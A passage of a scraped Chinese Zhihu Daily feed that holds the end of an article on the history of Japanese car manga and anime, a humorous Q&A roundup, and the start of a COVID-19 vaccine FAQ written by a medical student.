No.1》开始连载，标志着以汽车作为主题的漫画正式登上历史的舞台。单就日本漫画史来说，这应该是最早的以汽车作为主题的漫画作品。</p>\n<p>这部作品以勒芒赛车、方程式赛车为故事主线，开创了汽车类漫画的先河。当年这部漫画被誉为日本第一的赛车漫画。直至今日，还能购买到复刻版的《少年 No.1》漫画，可见它在漫画历史上也是举足轻重的一部作品。经过它的影响，令其他漫画家也开始创作汽车漫画。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-dc09338e89d5c5e9f293440ad05fcbfa_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-b81a98536ed4e5d2b297cc0462a25565_720w.jpg?source=8673f162\" alt=\"\"></figure><p>《少年 No.1》不仅是汽车类漫画的启蒙，它也为第一部风靡世界的汽车动画做出了铺垫。经过《少年 No.1》 时代，汽车漫画的情节、画风都得到了肯定。紧随其后漫画《王牌车手》开始连载，并获得更好的反响于是被拍成了动画《马赫 5 号》（也叫马赫 Go，日语 Go 与 5 同音）。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-a83ef2cb3b8e9f78099ef7dcc68db6ad_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>·第一部风靡全球的汽车动漫竟然不是《头文字 D》？</strong></p>\n<p>说到风靡全球的汽车动漫，可能大家第一个想到的是《头文字 D》，或者是《变形金刚》，毕竟这些离我们近一点。时光倒退个四、五十年，那时候日本就有一部以汽车为主题的动漫火遍了全球：《马赫五号》。</p>\n<p>这是一部美式风格的赛车冒险故事。主人公三船刚和一部拥有七种特殊功能的赛车马赫号，在世界各地参加比赛，粉碎恶势力的阴谋成为这部动画的主旋律。在情节上还不是单纯的赛车，当时比较流行的就是加入冒险元素，还记得 80 年代的汽车类电视剧《霹雳游侠》吗，一样是汽车加冒险。为什么说这部作品是美式风格呢，因为主角一家都很美国化，家庭人员的组成、服装搭配以及住宅都很美国化，应该是与当时的日本社会环境有关。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-f53fc63c2f3d8e2d894739428d7337fc_720w.jpg?source=8673f162\" alt=\"\"></figure><p>60、70 年代连法拉利都热衷于参加勒芒，于是这部漫画中有不少勒芒赛车的影子，情节上也与法拉利、福特等勒芒赛车交过手。车辆选择上几乎没有日本车元素。主角车型的设计也比较偏向当时的勒芒赛车。</p>\n<p>这辆车拥有七种特殊功能，这个创意在当时确实难得，加上冒险式的赛车故事，也虏获了不少车迷以外的观众。这七种功能分别为：按钮 A 伸出四根千斤顶让车跳跃、按钮 B 是轮胎保护带可以防弹、越野、按钮 C 为能电锯，用于切割障碍物、按钮 D 是防弹盾牌让敞篷车变成硬顶车、按钮 E 能让车灯射出红外线夜视、按钮 F 能给车内产生氧气并伸出潜望镜、按钮 G 能弹射无线电操作的通信小飞机。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-da6fb94adbf7763f443bf47a7239480a_720w.jpg?source=8673f162\" alt=\"\"></figure><p>这部动画很快火遍全球，在多个国家上映，其中也包括中国。国内的版本是引进的美国版本《Super Racer》。此外，正因为这部片子非常火，大众还趁机拿来宣传高尔夫，拍摄了主角驾驶高尔夫的广告短片。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-66844516328bdfd42305f4d02b5caf0e_720w.jpg?source=8673f162\" alt=\"\"></figure><p>除了大众，雪佛兰克尔维特也在 2001 年推出过《马赫 5 号》限量版车型，总数 100 辆。</p>\n<p>看到这儿是不是觉得这部动画很眼熟，确实它有不少衍生作品，除了 97 年翻拍过一次改名叫《超级麦哈号》外，近年来也出过真人电影版《极速赛车手》。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-15ad2b16807c1d49298ca6964103c1ca_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-fc205135f9385c2d73f2b077d1c96513_720w.jpg?source=8673f162\" alt=\"\"></figure><p>《马赫 5 号》的成功标志着日本汽车类漫画进入黎明期。</p>\n<p>经过了汽车类漫画的黎明期，许多漫画家都受到了启发与影响，于是更多的汽车类漫画开始涌现出来。当时的日本汽车工业也正处于发展期，不管是在世界上还是日本国内认可度都不算太高，日本民众也普遍喜爱进口车，更崇拜欧美的高档车。20 世纪 70 年法拉利和兰博基尼、保时捷等以跑车著称的厂家正推出一系列经典的车型，同时期的日本也处在一个疯狂追逐超级跑车的环境，这个时候《<strong>赛道之狼</strong>》诞生了，这部漫画包含了街头赛车、警匪追逐以及赛道比赛多种元素，精彩程度不亚于现在的《头文字 D》和《湾岸 Midnight》。</p>\n<p>《<strong>赛道之狼</strong>》因主角风吹裕矢赛车像飞驰的狼而得名。初期以街头赛车为主，对手都是法拉利、兰博等超跑，中后期情节转向赛道及方程式赛车。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-5e288576a5805e26f1f18bcdacbbe52c_720w.jpg?source=8673f162\" alt=\"\"></figure><p>当时的日本车实力一般，受环境影响，漫画中的主角们都驾驶着进口跑车 :保时捷 911、Dino 246GT、兰博基尼康塔什等，几乎没有日本车的一席之地。我的一位日本朋友，曾经是三菱的员工，参与过 4G63 的开发，还是多代 EVO 的企划负责人，他在那个年代也是深受这些动漫的影响，甚至有段时间一下子买过两台保时捷 911。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-82fe93e7507297064477744e07e92afe_720w.jpg?source=8673f162\" alt=\"\"></figure><p>不久前曾经做过《铁臂阿童木》、《鲁邦三世》等经典动画制品人的黑川庆二郎在采访中还说过这段历史：日本的动漫产业，就是一个给人以梦想的产业。他的朋友著名漫画家池泽早人师的作品——《<strong>赛道之狼</strong>》，讲述了一名赛车手的成长史，里面有很多跑车登场，法拉利、保时捷、兰博基尼、路特斯、玛莎拉蒂等，当时很多青少年都因为看了这部漫画连载，就想做和汽车相关的工作。他们当中有的做上了汽车设计者，有的做上了汽车修理工、汽车推销员等。正因为有他们，日本的汽车产业才能做到世界前列。</p>\n<p>这部漫画的知名度后来不断的提升，加上情节上的需要，才有了像丰田 2000GT、日产 240Z 这样的日本本土 GT 跑车加入到故事中。以当时的环境来看，日本车厂在跑车方面没有什么大的建树，这部漫画的不仅为厂家做出了一定的宣传，同时也推动了厂家的发展。</p>\n<p>《<strong>赛道之狼</strong>》这次不仅让小孩开始迷上汽车，同时也适用成年人，同样的也被搬上过荧幕，拍成真人电影，这个可比《头文字 D》早上 20 年。</p>\n<p>那个年代的赛车电影，请的著名车手比明星都多，虽然《头文字 D》拍摄时大家都经过了一些基础的培训，但跟这些职业车手比还是差的很远。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-8e16909e2289d5fdae8cca76a50a1515_720w.jpg?source=8673f162\" alt=\"\"></figure><p>高桥国光：日系漂移创始人、参加过勒芒、全日本房车锦标赛等，至今还活跃在赛场上，跑跑小比赛。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-e40633228b66e8c3935b48a0484aaf50_720w.jpg?source=8673f162\" alt=\"\"></figure><p>星野一义：外号日本最速男，驾驶 GT-R R32 做出连胜纪录的人，曾出战过 F1 日本站（当时是真年轻....一点都不胖）</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-d1f610bc0ed168e00a44b225a79d71f7_720w.jpg?source=8673f162\" alt=\"\"></figure><p>中岛悟：日本历史上第一位 F1 车手，参与过不少本田跑车的开发。他儿子也开过 F1，勒芒等世界级大赛。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-14b19840ea3adca571384cfbf17d18a8_720w.jpg?source=8673f162\" alt=\"\"></figure><p>长谷见昌弘：东望洋 R32 的故事大家都听说过吧，说的就是他。</p>\n<p>出镜的车可比 AE86 要稀有的多的多。AE86 现在在祖国大地还能见到上牌的合法车，《<strong>赛道之狼</strong>》里的车估计不少都只能在博物馆里看看了。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-8c5199ddd4f45fa072de9110497f90c3_720w.jpg?source=8673f162\" alt=\"\"></figure><p>作为汽车漫画史上的一个里程碑，最后还专门建立了一座《<strong>赛道之狼</strong>》博物馆，里面展示了漫画中出现过的车子，并且按照漫画的样子进行真实还原。由此可见这部作品的影响力有多大。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-d47ee41eeff1ecae19632f088a3ac194_720w.jpg?source=8673f162\" alt=\"\"></figure><p>博物馆中的车辆都是按照作者笔下的样子进行改装，其中不乏兰博基尼 Muria、法拉利 Dino 这些极其少见的超跑。70 年代日本玩具业发达的时候还因为这部作品导致汽车模型与传统玩具市场互掐的局面。《<strong>赛道之狼</strong>》人气大涨后自 75 年起在日本掀起一阵前后约三年的超级跑车风潮，鼎盛期 77 年时，日本传统的角色玩具因超级跑车的大卖而遭受了很大打击。销量能比前一年下跌三成，大家都去买跑车模型了，别的都卖不动。</p>\n<p>这部作品不仅影响了漫画作家、喜欢机械的小孩儿和大人，毫不夸张的说，自此之后漫画也是支持日本汽车企业的一个重要工具。</p>\n<p><strong>·日本 F1 时代对汽车漫画的影响</strong></p>\n<p>1976 年，F1 开始增设日本站，比赛地点为富士高速赛道。当时还没有日本车手能参赛，但在民间已经掀起了一股向往 F1 比赛的浪潮。对，1976 年 F1 日本站，就是电影《Rush》中 James 和 Niki 雨中博弈的那一年。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-b72e4c5af0335bd999c50bf2af79f13b_720w.jpg?source=8673f162\" alt=\"\"></figure><p>F1 日本站举办的第二年就有新的汽车漫画就出现了，《红色天马》一部从真实的角度描写 F1 赛事的故事诞生。里面有大量车队、机械师、赛车开发相关的内容，给大家呈现出一个真实的 F1 世界。70 年代日本还没有 F1 车手，漫画中使用了 Ken 这个英籍日本人，架空的日本 F1 车队，及架空的 1977 年 F1 赛季，但却从真实的角度讲述 F1 的世界。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-d3d9d00a5be67f4765de4b6d596db817_720w.jpg?source=8673f162\" alt=\"\"></figure><p>虽然整个故事都是驾空的，但是里面出现了不少真实世界里的车手，包括 James 和 Niki，星野一义和高桥国光等。当时甚至有人觉得看漫画如同看 77 年的 F1 现场转播一样。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-bc33cdcf6ed05a5b6e28e5a8ab19c1c5_720w.jpg?source=8673f162\" alt=\"\"></figure><p>现实中的比赛加上漫画的影响，相信当时不少人开始梦想成为车手，这就是汽车文化的影响力，谁能知道在十年后，就真的出现了日本的 F1 车手呢？1977 年之后 F1 日本站停办了许久，直至 1987 年才又大张旗鼓的重新举办起来。重办的同时，新的 F1 主题漫画《F》开始连载，与之前不同的是，这是以日本本土方程式车手成长为故事主线。</p>\n<p>《F》从主角赤木军马参加 FJ1600 低组别方程式比赛开始讲起，一直到进入 F1。故事的叙述非常像当时的日本车手。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-b535653a51a331d9380bd168af2b6ef2_720w.jpg?source=8673f162\" alt=\"\"></figure><p>其实这个故事的原型就是我朋友，日车赛车手中谷明彦。他就是从赤木军马这个年龄开始跑 FJ1600 方程式，且第一站就是杆位，并且得了第一名。但他与军马不同的是，军马只是个高中没毕业，不懂理论硬上的赛车天才。中谷则是理论派车手，大学工科毕业。他在夺得 FJ1600 首战第一后，竟然拒绝了斯巴鲁车队的邀请，原因只为回大学写论文好毕业。不过好在最后跟军马一样，签</p>\n<p>约了 F1 车队。中谷曾经跟我说漫画里有他出镜....不过我一直没看到，应该在很后面了。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-7bd05fdc308b3c14e6377c2062ed22e7_720w.jpg?source=8673f162\" alt=\"\"></figure><p>中谷明彦，EVO5 到 10 代的开发测试车手、LFA 纽北版开发测试车手</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-dac285a1b5981057e49dd7fdd576163e_720w.jpg?source=8673f162\" alt=\"\"></figure><p>FJ1600</p>\n<p>这部漫画也拍成动画，并且引进过中国，不过只是 FJ1600 到 F3 这阶段，剩下只有看漫画。</p>\n<p>《F》推出时据《红色天马》已经有十年之久，这时日本第一位 F1 正式车手诞生，中岛悟出任路特斯车队的正式车手。随着同类别的赛车主题漫画、动画越来越多，之后日本也不断有新的 F1 车手出现，更有不少年轻人受漫画与动画的启蒙，立志成为一名赛车手。此时，汽车漫画已经进入全盛时期，汽车漫画文化开始对汽车从业者产生影响。</p>\n<p>在 F1 停办的那几年中，70 年代末 80 年代初有一部讲汽车技师的漫画出现，名字叫《车博士》/《车医生》，漫画从汽车机械师的角度来描写，里面有大量改装汽车、自己动手摆弄汽车的情节。漫画推出之后，日本社会中就开始流行自己动手研究自己的车，改装的风潮也就开始兴起。以往的赛车漫画都以车手为主视角，这一次则从机械师的角度来讲赛车、讲改装。人们对车的认知又从赛车场上回到的生活中。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-f63c54ddae2d323dc50df7b9669aea05_720w.jpg?source=8673f162\" alt=\"\"></figure><p>在日本的改装史上，改装也确实兴起与那个年代。80 年代日本国产车的更新换代期，大量的涡轮增压车型出现，各厂家间都在拼最大马力，一时间拉开“马力战争”的序幕。同时，大量的街头车手涌现，更多的人希望有更高性能，更好操控性的车子。</p>\n<p>从这部漫画起，80 年代的日系跑车才大量的出现在漫画中。故事也从离人们较远的高等级比赛转移到房车赛上。与车互动的情节也越来越多。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-55b0f4e0479cd870831e542aa3beeb57_720w.jpg?source=8673f162\" alt=\"\"></figure><p>诞生于那个年代的日本跑车确实不少，淑女 Z FairLady、广岛保时捷 RX-7 还有 Celica、S800 等。这些车虽说是跑车，但在诞生之时都比较弱，为了能和欧美跑车相媲美，大家才会去改装。</p>\n<p>这部《车博士》的漫画就描绘了这样的一个时代，为了更强劲的动力以及更好的操控性，不惜一切改装自己的车子。漫画中展现了以前汽车漫画都少有的汽车专业知识，自这部漫画起，汽车漫画的格局又一次发生了改变。也正是从这个时候开始，日本车厂争相推出高性能跑车，不计成本的研发高级跑车。有了这样的铺垫，才有了 90 年风起云涌的日系性能车黄金年代，也正因为有了“马力战争”才有了后来 280 马力的君子协定。</p>\n<p>虽然 80 年还有与汽车有关的一个动画风靡全球，但因为主题以拯救世界为主，并且是欧美动漫，就不在这做讨论了，没错我说的就是《变形金刚》。</p>\n<p><strong>·“街头赛车”源自生活更高于生活</strong></p>\n<p>再往后的汽车类漫画发展，与最初的时候相比就像反过来了，以前是漫画影响现实，后来则是通过现实创作漫画。80 年代末的日本社会上的暴走族，以及被成为“走り屋”的飞车党出现在人们的视野里，于是漫画家将这种社会现状进行艺术加工形成了新的故事，20 世纪末两大影响了世界车迷的故事诞生，一个叫《湾岸 Midnight》，另一个就是大街熟知的《头文字 D》。</p>\n<p>《湾岸 Midnight》比《头文字 D》还要早近十年的时间，因为 80 年代飞车族争相改装跑车想在湾岸跑出 300 公里 / 小时以上的时速，才有了这个题材。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-a879c85a22b0d7531a0cae201a7526e4_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-5b69d427d89d2f9f9b458ba16e2ba5ac_720w.jpg?source=8673f162\" alt=\"\"></figure><p>虽然现实中也有湾岸的飞车党，也确实跑到过动画中的程度，但是动画有时候也有些过度描写。还有《头文字 D》也是一样，虽然源自生活，却高于生活，里面大量的情节都太过神话，不管是车辆性能还是比赛情节都过于理想化。中谷明彦做为《头文字 D》中的故事原型也坦言里面大量的飙车情节有些过分夸张，只是为了达到漫画的效果而已，毕竟漫画存在的意义有时候也是为了实现现实中不太好实现的事情。《湾岸 Midnight》和《头文字 D》中有着大量现实中身边的汽车，这也让读者们更有了代入感，同时也令各车厂的车型地位提升，比如丰田 AE86。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-2eb4ac6ffbe61cd122df8b83ac290180_720w.jpg?source=8673f162\" alt=\"\"></figure><p>《头文字 D》是汽车漫画在全球范围内引起热潮的第二个作品，它的影响力一点不亚于《马赫 5 号》，它让世界各地的车迷都知道有一款车叫 86；有一座山叫秋名山；有一种驾驶技术叫漂移。它衍生出来的周边不仅有动画，也推出了电影，不仅有街机游戏，还有各式各样的模型。世界各地即将进入废车场的老日系性能车也因它有了第二次生命，被车迷挽救回来模仿着漫画改装的焕然一新。丰田也因这部漫画的热潮决定重返运动车市场研发了丰田 86，继续发扬“86”这个极具象征意义的名号。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-91bb2a310e596b41142e45f67dcf154c_720w.jpg?source=8673f162\" alt=\"\"></figure><p>丰田 86 就是动漫推动汽车发展最好的证明，丰田不惜一切的复活 86 这个名号也确实是因为动漫给它带来了意想不到的明星效应。</p>\n<p>除了这两个现实取向的汽车类动画外，还有一个超现实的赛车主题动画《高智能方程式》，带有人工智能的赛车，千奇百怪的变形系统，在未来取代 F1 成为世界最高界别赛事。故事的设定在 2014 起到 2022 年，虽然现在赛车还没有跑到 600-700 的时速，但是动画中的很多科技都已经得到了实现。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-980688c69d0f3d0435b81bb50586aecf_720w.jpg?source=8673f162\" alt=\"\"></figure><p>在整个 80、90 到 00 年代有不少新汽车类漫画出现，只是有的缺少动画，所以知道的人不多。比如《SS》、《极速方程式》等等。另外还有些四驱车的动画也曾经在国内非常火，不管是早期的《四驱郎》还有后来《四驱兄弟》都让人们对汽车产生了兴趣。最后放上一张汽车类漫画发展年表：</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-818ba148c007bd9bbe8899d3eda00b49_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-61aa7956f2c50414d6e060c993ac861f_720w.jpg?source=8673f162\" alt=\"\"></figure><p>其实有时候大家谈起汽车文化会觉得空洞，觉得张口闭口的汽车文化缺乏内涵，但今天聊的这些就是真正的汽车文化，在这些文化影响下，才有了现实中的汽车大国。希望未来国内也能有空前繁荣的汽车文化出现，不仅可以带动自主品牌的崛起，也可以为了以后的汽车事业培养出更多热爱汽车的新人。</p>\n<p>以上</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/60780485\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737865"},{"title":"瞎扯 · 如何正确地吐槽","date":"2021-07-07 23:06:15","description":"\n<div>\n<h2>送女朋友拼好的乐高城堡算直男行为吗？</h2>\n<div>\n<div>\n<img src=\"https://pic3.zhimg.com/da8e974dc_l.jpg?source=8673f162\"><span>Jxxxx，</span><span>大学生</span>\n<a href=\"https://www.zhihu.com/question/416541593/answer/1975312580\" hidden>阅读原文</a>\n</div>\n<div>\n<p>前天晚上和男朋友一起拼了乐高的迪士尼城堡的一小小小半，然后就让他带回家了，约好下次出来再一起拼。今天打视频电话的时候发现，他自己一个人基本拼完了，留了个副塔尖尖给我，说是防止我生气给我留的......</p>\n<p>看到基本成品的那一刻脑袋真实的嗡嗡响，他送我的时候说的那句「我们一起拼，拼完你就住进去！」一直在脑子里面回荡。我不想要吵架，不想让他觉得我无理取闹，但我实在觉得恶心，甚至整个城堡都不想要了。</p>\n<p>拼都拼完了给我干什么？我顶多算个给城堡打地基的建筑工人，我是个住不进城堡的公主病。对我来说，这个迪士尼城堡是他的又一个乐高玩具，不是我们的城堡。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/416541593\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>敖丙为什么打不赢哪吒？</h2>\n<div>\n<div>\n<img src=\"https://pic3.zhimg.com/v2-4c57ebb54e590886da56bba477298674_l.jpg?source=8673f162\"><span>柒个葫芦，</span><span>想恋爱</span>\n<a href=\"https://www.zhihu.com/question/338438233/answer/778221253\" hidden>阅读原文</a>\n</div>\n<div>\n<p>片名已经告诉你了，叫哪吒之魔童降世，不是叫敖丙之灵珠崛起</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/338438233\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>人们平均每洗一次头要掉多少根头发？</h2>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-8c6350c6dbef2ee7c8c129d52dcd833d_l.jpg?source=8673f162\"><span>稀罕小尤，</span><span>音乐</span>\n<a href=\"https://www.zhihu.com/question/355922505/answer/925964112\" hidden>阅读原文</a>\n</div>\n<div>\n<p>我不清楚这个问题</p>\n<p>因为我已经没有头发了</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/355922505\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>如何激怒一个航天爱好者？</h2>\n<div>\n<div>\n<img src=\"https://pic3.zhimg.com/v2-367d63c324eaa55217bff8000ec78419_l.jpg?source=8673f162\"><span>昙花再现，</span><span>昙花一现又再现，此中真意已惘然。</span>\n<a href=\"https://www.zhihu.com/question/339517523/answer/781694883\" hidden>阅读原文</a>\n</div>\n<div>\n<p>“你说的不对，大刘是这样说的……”</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/339517523\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>如何跟我爸解释刘慈欣不是疯子?</h2>\n<div>\n<div>\n<img src=\"https://pic3.zhimg.com/e7b064ce081e4ff42ae2d558b4b81a37_l.jpg?source=8673f162\"><span>邓cl，</span><span>药师</span>\n<a href=\"https://www.zhihu.com/question/329191493/answer/718104755\" hidden>阅读原文</a>\n</div>\n<div>\n<p>诚恳的对您爸爸说：“您说得对，刘慈欣就是疯子！”</p>\n<p>然后该干嘛干嘛。</p>\n<p>放心，没人找你麻烦的。</p>\n<p>因为：</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-9a7799f0c6057c4d860f79710286094c_720w.jpg?source=8673f162\" alt=\"\"></figure>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/329191493\">阅读原文<span></span></a></div>\n</div>\n","link":"https://daily.zhihu.com/story/9737875"},{"title":"关于新冠疫苗，你想知道的问题都在这里了","date":"2021-07-07 09:30:29","description":"\n<p>自新型冠状病毒（COVID-19）席卷全球以来，人类社会至今仍备受其困扰。新冠病毒已经用实力向我们证明了它不同于过往的流行性病毒，我们也不可能像对待 SARS 那样仅做有限的隔离治疗，等待病毒自然消失。眼下能帮大家真正脱离恐慌并真正摆脱病毒困扰的唯一办法就是全民接种疫苗。</p>\n<p>此前，由于全国疫情相对稳定且碍于疫苗产能不足、副作用不清楚等情况，新冠病毒疫苗通常优先让重点人群（包括但不限于频繁接触公众的服务群体、有经常性移动需求的从事贸易交际人士）接种。随着广深两地及国内其它地区开始出现变异毒株输入，全面接种变得刻不容缓。</p>\n<p>其实在 2021 年 3 月 29 日，为了配合疫苗的广泛接种工作，中国疾控中心就发布了《<a href=\"https://baijiahao.baidu.com/s?id=1695572881311396223&amp;wfr=spider&amp;for=pc\">新冠病毒疫苗接种技术指南（第一版）</a>》（以下简称为《接种指南》），其中对疫苗的适应人群、禁忌症等都有较为明确的指示。</p>\n<p>然而它更多的是面向执行接种工作的社区医务人员，其中的一些描述对于广大预接种者而言不那么易懂，这就可能会造成信息的不对等，进而心存不必要的顾虑，耽误疫苗的接种。因此，我收集了身边的亲友、同学的比较在意的问题，以《新冠病毒疫苗接种技术指南（第一版）》为基础，结合能查阅到的一些官方权威的资料和在学校所学的基础临床知识，整理出了这一份问答形式的疫苗知识指南，希望搭起一条「从技术指南到实地接种」的桥梁。</p>\n<p><strong>注：</strong>写这篇文章的动力很大一部分是来源于我身边的亲友在面对疫苗接种时表现出的困惑以及提出的问题，同时也受制于我作为一名初涉医学领域的临床医学生所掌握的知识极其有限，因此，本文不可能面面俱到，不免在科普与解读中有所疏漏。如有事实错误，欢迎专业人士在评论区批评指正。</p>\n<h2>Part 1：疫苗是什么？</h2>\n<h3>疫苗是什么？常见种类有哪些？</h3>\n<p>人民卫生出版社的第九版《免疫学》，第二十五章免疫学防治的描述如下：</p>\n<blockquote><p>免疫预防（immunoprophylaxis）是人工主动免疫的主要目的，其主要措施是接种疫苗。疫苗（vaccine）是接种后能使机体对相应疾病产生免疫力的生物制剂类的统称。</p></blockquote>\n<p>简单地讲，注射疫苗的作用就是让你的身体对某些疾病产生免疫力。</p>\n<p>目前，大家常见的新冠病毒疫苗有「打一针」、「打两针」和「打三针」三种，恰好对应了三种常见的疫苗类型，它们分别是：</p>\n<ul>\n<li>大家都想打的、一针见效的疫苗，属于「腺病毒载体疫苗」。我国的腺病毒疫苗由康希诺生物股份公司生产，与英国阿斯利康疫苗、美国强生疫苗是同一种类型。</li>\n<li>目前最常见、接种范围最广的「打两针」疫苗，免疫学分类上属于「灭活疫苗」。包括北京生物、武汉生物和北京科兴三种，而出于解决疫苗产能的需求，在药监部门的批准下北京生物生产的疫苗原液分别在长春生物所、兰州生物所、成都生物所进行最后的分装盒包装生产。灭活疫苗也是我们日常生活中接触最多的疫苗类型，常见的有百白破疫苗、乙脑疫苗、甲肝疫苗以及流感疫苗等。</li>\n<li>而相比前两种而言，因耗时较长而不那么受待见的「打三针」疫苗——重组新冠病毒疫苗（CHO 细胞），属于「重组亚单位疫苗」，由安徽智飞龙科马生物制药有限公司生产。常见的亚单位疫苗有重组乙肝病毒表面抗原疫苗、重组口蹄疫疫苗和重组莱姆病疫苗等，埃博拉病毒疫苗也主要采用这种形式。</li>\n</ul>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/07/c57ccca36219a235b8d78cb3067b3a66.jpg\"><figcaption>@央视新闻 给出了简单易记的图示</figcaption></figure><p>由于作用原理不同，以上三种疫苗不可以混打。关于不同疫苗作用原理的区别，下文还会另行描述。</p>\n<h3>疫苗是如何产生作用的？</h3>\n<p>要了解疫苗如何发生作用，首先我们要了解免疫系统是什么。</p>\n<p>绝大多数正常人（除少数因免疫系统发育不良等导致的先天性免疫缺陷患者）从出生到成长的过程中都具有一定的抵抗外界病原体入侵的防御力，这种防御力就是我们常说的「免疫力」。</p>\n<p>免疫力包括固有免疫和适应性免疫，前者是我们在长期的生物进化过程中逐渐形成的免疫防御体系，包括但不限于能作为物理屏障挡住细菌和病毒的皮肤、黏膜等，我们身体也能分泌一些具有杀菌作用的物质，比如唾液（不知道大家是否和我一样小时候都有弄伤了然后爸妈教用口水抹一下的经历😅，理论上来说这么做还真的稍微有点道理）。</p>\n<p>而后者的获得方式包括自然免疫和人工免疫两种，自然免疫就是我们在自然条件下得病痊愈后产生的免疫力，最常见的就是得过水痘的人往往不会得第二次，且对于绝大多数人终身免疫水痘。人工免疫就是人为地让我们「患病」从而产生免疫力，打疫苗就是最常见的一种人工主动免疫。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/07/1ba328171d10c530e216ec81df5557f4.png\"><figcaption>免疫力的类型</figcaption></figure><p>上面的理论可能不太好理解，下面我来举个例子。假设我们的身体是一栋房子，免疫系统就是屋里的保安，病毒就是要进来搞破坏的坏人。打疫苗的过程就相当于把坏人的长相提前告知保安，让保安记住他们的模样。当坏人想要再次入侵时，保安就能够及时采取行动，保障房子的安全。</p>\n<p>还记得我们在上文说到的三种疫苗类型吗？在这个「保安与坏人」的例子里，每种类型疫苗的作用原理也稍有不同——</p>\n<ul>\n<li>腺病毒载体疫苗（打一针）相当于把一个没有战斗力的菜鸡（即「腺病毒」）伪装成真的坏人来给保安辨认，在与「假坏人」搏斗的同时，保安也就记住了真坏人的特征。</li>\n<li>灭活疫苗（打两针）相当于把坏人的尸体拿来给保安辨认。只要后来的坏人长得和尸体差不多，保安都能把他们拒之门外。而用以提高免疫原性的氢氧化铝佐剂可以理解为把坏人的特征暴露得更明显一点，方便加强保安记忆力。</li>\n<li>至于重组新冠病毒疫苗（CHO 细胞），则是将坏人解构，只将他身上能破坏屋子的部分带给保安辨认（实际提取的是病毒的纯化蛋白质结构，此类物质可以激发身体的免疫反应）。</li>\n</ul>\n<p>总而言之，人的免疫系统具有「记仇」的特点——只要身体被某种病毒攻击过，免疫系统就会记录其特征，并在下次遇到时防患于未然。因此，疫苗的作用原理就是将特殊处理过的微量病毒注入人体，激活免疫反应，并引导人体产生对应的抵抗力。</p>\n<p>而且，无论是哪一种疫苗都不会导致注射后感染新冠病毒，因为每一种都只是病毒的不完全体，不具备致病性，只起着让我们的免疫系统辨认病毒并记住，从而产生免疫力。</p>\n<h2>Part 2：疫苗接种小知识</h2>\n<h3>如何预约疫苗接种？</h3>\n<p>随着全民疫苗接种政策的推行，全国各地都设立了不同的疫苗预约接种方式，但目前还没有统一的全国预约平台。</p>\n<p>整体来说，当下预约疫苗接种分为以下三种渠道：</p>\n<ol>\n<li>微信搜索「疫苗预约」，搜索结果将优先显示你所在地的疫苗接种信息，多数地区都能直接给出在线预约入口。</li>\n<li>搜索和关注你所在地的卫健委或疾控中心的微信公众号，部分地区的疫苗预约入口由卫健委或疾控中心直接管理。</li>\n<li>前往你居住的小区所在的社区医疗服务中心，询问距离你最近的疫苗接种点。部分社区医疗点会直接提供疫苗注射服务。</li>\n</ol>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/07/e988fb76ca7dff57779958bc4b1eaaf3.jpg\"><figcaption>在微信内搜索「疫苗预约」会优先出现当地接种信息，疾控中心通常也能预约</figcaption></figure><h3>为什么打完疫苗之后会有头疼、乏力、发热等症状？副作用越明显，免疫效果越显著吗？</h3>\n<p>如果你了解了疫苗的原理，再面对这个问题也就不难理解了——疫苗注入身体后激活我们的免疫系统，头疼、乏力、发热等都是正常的免疫反应。注入身体的虽然不是完整的病毒，但毕竟是「坏东西」，「保安」们会全力工作，直到确认扫清「坏人」为止。</p>\n<figure class=\"image ss-img-wrapper\"><img 